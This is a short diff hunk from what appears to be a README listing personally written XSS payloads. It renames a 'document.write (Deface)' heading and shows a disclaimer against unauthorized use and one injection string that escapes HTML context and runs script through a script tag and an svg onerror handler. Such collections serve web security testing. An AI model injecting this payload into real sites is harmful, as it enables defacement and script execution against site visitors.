@@ -10,7 +10,7 @@ Personally created XSS payloads
 > Do not use these payloads in a random or unauthorized web site, I do not take any resposibility <br>
 > to any script kiddies who decide to execute those on random places, you have been warned!
 
-## document.write (Deface) <br>
+## document.write <br>
 
 ```html
 ;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
